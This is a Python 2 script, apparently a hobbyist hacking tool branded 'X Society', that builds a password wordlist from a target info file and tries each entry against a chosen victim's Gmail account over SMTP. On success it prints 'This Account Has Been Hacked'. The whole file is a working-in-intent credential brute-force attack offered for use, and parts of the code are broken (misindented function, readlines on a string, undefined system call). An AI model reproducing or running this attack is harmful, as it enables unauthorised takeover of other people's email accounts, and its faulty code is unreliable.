#!/usr/bin/env python
import time
import sys
import re
import smtplib
import os
import subprocess
#===[Database of script here]====================================================================================
alpha = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
num = [1,2,3,4,5,6,7,8,9,0]
special = ["~","!","@","#","^","*","(",")","-","+"]
#==================================================================================================================
def main():
   print '============================='
   print '  Created By [X Society]     '
   print '============================='
   print '       _,.                   '
   print '     ,` -.)                  '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|            , '
   print '   \_| |`-._/||          , | '
   print '     |  `-, / |         /  / '
   print '     |     || |        /  /  '
   print '      `r-._||/   __   /  /   '
   print '  __,-<_     )`-/  `./  /    '
   print '  \   `---    \   / /  /     '
   print '     |           |./  /      '
   print '     /           //  /       '
   print ' \_/  \         |/  /        '
   print '  |    |   _,^- /  /         '
   print '  |    , ``  (\/  /_         '
   print '   \,.->._    \X-=/^         '
   print '   (  /   `-._//^`           '
   print '    `Y-.____(__}             '
   print '     |     {__)              ' 
   print '            () version 1.0   '

main()
#==================================================================================================================
print '[1] start the attack'
print '[2] exit'
#==================================================================================================================
option = input('==>')
if option == 1:
	#taking first information file location here...
	user_input_0 = raw_input("Enter the path of your Info.txt file: ")
	#now taking user own wordlist file location here....
	user_input_1 = raw_input("Enter the path of your own wordlist file: ")
else:
   system('clear')
   exit()
#==================================================================================================================
print '[1] Gmail'
option_1 = raw_input("Where you want try this wordlist please enter number ex. 1 gmail: ")
#====[user_input[1]]========================================================================================
assert os.path.exists(user_input_0), " [+] I did not find the file at, "+str(user_input_0)
f = open(user_input_0,'r+')
print(" [+] Info.txt File founded")
f.close()
#====[user_input[2]]========================================================================================
assert os.path.exists(user_input_1), " [+] I did not find the file at, "+str(user_input_1)
f = open(user_input_1,'r+')
print(" [+] wordlist.txt File founded")
f.close()
#========[Reading file here[0]]========================================================================
f = open(str(user_input_0),"r+")
input_1 = f.read()
f.close()
#========[Reading file here[1]]========================================================================
f = open(str(user_input_1),"r+")
input_2 = f.read()
f.close()
#==========================================================================================
x = input_1 + input_2
#==========================================================================================
#writting finall wordlist
f = open("wordlist.txt","w")
f.write(x)
f.close()
#==========================================================================================
print(" [+] Wordlist is created successfully")
print(" [+] Find wordlist.txt")
f = open("wordlist.txt", "r")
final_wordlist = f.read()
pass_list = final_wordlist.readlines()
#==========================================================================================
if option == 1:
	print(" [+] Starting passowrd attack gmail address.")
	#==========================================================================================
		def login():
	    i = 0
	    user_name = raw_input('target email :')
	    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	    server.ehlo()
	    for password in pass_list:
	      i = i + 1
	      print str(i) + '/' + str(len(pass_list))
	      try:
		 server.login(user_name, password)
		 system('clear')
		 main()
		 print '\n'
		 print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
		 break
	      except smtplib.SMTPAuthenticationError as e:
		 error = str(e)
		 if error[14] == '<':
		    system('clear')
		    main()
		    print '[+] this account has been hacked, password :' + password + '     ^_^'

		    break
		 else:
		    print '[!] password not found => ' + password
	login()
	#==========================================================================================
#==========================================================================================
